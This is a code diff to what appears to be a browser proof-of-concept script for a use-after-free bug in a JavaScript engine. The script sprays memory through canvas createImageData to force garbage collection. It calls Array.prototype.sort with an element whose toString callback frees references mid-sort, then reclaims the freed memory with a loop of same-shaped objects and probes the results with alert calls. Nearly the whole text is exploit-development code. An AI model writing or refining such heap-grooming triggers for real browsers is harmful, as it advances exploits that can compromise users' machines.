@@ -6,8 +6,8 @@ function gc() {
         var c = document.createElement("canvas");
         var gl = c.getContext("2d");
 
-        for (var i = 0; i < 2; i++) {
-            var gggg = gl.createImageData(1, 0x1000000)
+        for (var i = 0; i < 0x100; i++) {
+            var gggg = gl.createImageData(1, 0x10000)
         }
     } catch (e) {
 
@@ -16,26 +16,27 @@ function gc() {
 function sleep(d){
   for(var t = Date.now();Date.now() - t <= d;);
 }
-
+alert(23)
 var c = new Array(0x1000)
-var b = new XMLHttpRequest()
-var a = [1,{toString:function(){
- a[2] = {};
+var b = {'a':1,'b':2, 'c':3}
+var a = [b,{toString:function(){
+ a[0] = null;
  b = null
  //for(var i=0;i<0x10;i++){
  gc();
  //}
- //sleep(1000)
- //alert(111)
+ sleep(1000)
+ alert(111)
  for (var j=0; j < c.length; j++) {
-	c[j] = new Error()
-	c[j].toString = function(){alert('ok'); return '666'}
+	c[j] = {'a':7,'b':2, 'c':3}
+	//c[j].toString = function(){alert('ok'); return '666'}
  }
+this.toString = null
  return "aaa";
-}}, b, 2]
+}}, 2]
 a.sort();
 alert(a[0]);
 alert(a[1]);
 alert(a[2]);
-alert(a[3]);
+//alert(a[3]);
 </script>
